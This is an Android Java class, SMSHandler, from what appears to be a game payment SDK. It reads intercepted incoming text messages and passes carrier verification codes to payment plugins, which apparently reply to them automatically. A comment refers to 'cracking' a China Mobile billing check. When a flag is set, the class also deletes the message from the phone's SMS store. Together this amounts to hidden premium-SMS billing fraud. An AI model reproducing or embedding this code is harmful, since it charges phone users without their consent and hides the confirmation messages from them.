package mobi.zty.sdk.game.intercept;

import java.util.List;
import java.util.Map;

import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.factory.PaymentFactoy;
import mobi.zty.sdk.game.GameSDK;
import mobi.zty.sdk.game.bean.GroupFeeInfo;
import mobi.zty.sdk.util.StringUtil;
import mobi.zty.sdk.util.Util_G;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;

/**
 * 注意短信拦截 回复验证码的 条件（有些直接根据验证码下行端口就能判断 有些还要结合短信内容）
 * @author Administrator
 *
 */
public class SMSHandler extends Handler {
	private ContentResolver resolver;
	private Context context;

	public SMSHandler(ContentResolver resolver, Context context) {
		super();
		this.resolver = resolver;
		this.context = context;
	}

	public void handleMessage(Message message) {
		
		try {
			MessageItem item = (MessageItem) message.obj;
			String content = item.getBody();
			String sender = item.getPhone();
			Util_G.debugE("Intercept", "verifySms-->>"+item.toString());
			GameSDK instance = GameSDK.getInstance();
			if (instance == null) return;
			GroupFeeInfo groupFeeInfo = instance.getCurgGroupFeeInfo();

			for (Map.Entry<Integer, Integer> entry:groupFeeInfo.intdexMkMap.entrySet()) {
				int key = entry.getKey();
				if (groupFeeInfo.getIntdexVerifyMap().get(key) == 1) {
					if (GameSDK.getInstance().mkMap.containsKey(entry.getValue())) {
						try {// 移动MM安安破解
							PaymentFactoy.producePay(GameSDK.getInstance().mkMap.get(entry.getValue()).mkClassName,GameSDK.getInstance().context)
									.sendVerifyCode(sender,content,key);
						} catch (Throwable e) {
							e.printStackTrace();
						}
					}
				}
			}
		
			
			if (GameSDK.mbDelSMS.equals("1")) {
				Util_G.debugE("ALLPAY","sms deleted!!!!!!!!!!!");
				resolver.delete(Uri.parse("content://sms"), "_id=" + item.getId(), null);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
